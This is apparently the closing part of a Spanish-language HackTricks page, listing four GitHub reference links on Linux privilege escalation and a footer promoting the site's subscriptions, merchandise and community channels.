[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme en Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
